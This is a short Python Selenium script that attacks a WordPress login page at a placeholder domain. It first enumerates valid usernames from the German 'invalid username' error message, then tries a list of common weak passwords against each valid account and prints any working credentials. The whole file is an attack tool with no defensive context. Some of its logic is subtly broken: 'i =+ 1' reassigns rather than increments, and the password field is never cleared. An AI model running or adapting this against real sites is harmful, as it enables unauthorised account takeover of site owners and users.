from selenium import webdriver
from time import sleep

usernames = ["Albrecht", "Franziska", "Peter", "Admin", "Mogli"]
valid_usernames =[]

driver = webdriver.Chrome(executable_path = r"D:\Downloads\chromedriver_win32\chromedriver.exe")
driver.get('http://[yourfancydomainname]/wp-login')

for i in usernames:
    user_input = driver.find_element_by_id("user_login")
    user_input.send_keys(i)
    
    password_input = driver.find_element_by_id("user_pass")
    password_input.send_keys("1")
    
    login_button = driver.find_element_by_id("wp-submit")
    login_button.click()
    
    sleep(2)

    message = driver.find_element_by_id("login_error")
    message_content = message.get_attribute('innerHTML')
    
    
    if ("Ungültiger Benutzername" in message_content):
        i =+ 1
        continue
    else:
        valid_usernames.append(i)
        driver.find_element_by_id("user_login").clear()
        i =+ 1
        continue
    
print(valid_usernames)

passwords = [ "1234", "123456", "qwertz", "admin", "tarzan"]


for i in valid_usernames:
    driver.find_element_by_id("user_login").clear()
    user_input = driver.find_element_by_id("user_login")
    user_input.send_keys(i)

    for j in passwords:
        password_input = driver.find_element_by_id("user_pass")
        password_input.send_keys(j)

        login_button = driver.find_element_by_id("wp-submit")
        login_button.click()

        sleep(2)

        try:
            message = driver.find_element_by_id("login_error")
            j =+ 1
            continue

        except:
            print("Valid Login Information:", i,j)
            i =+ 1
            sleep(2)
            driver.delete_all_cookies()
            driver.get("http://[yourfancydomainname]/wp-login")
            sleep(2)
            break
            
            
    
           


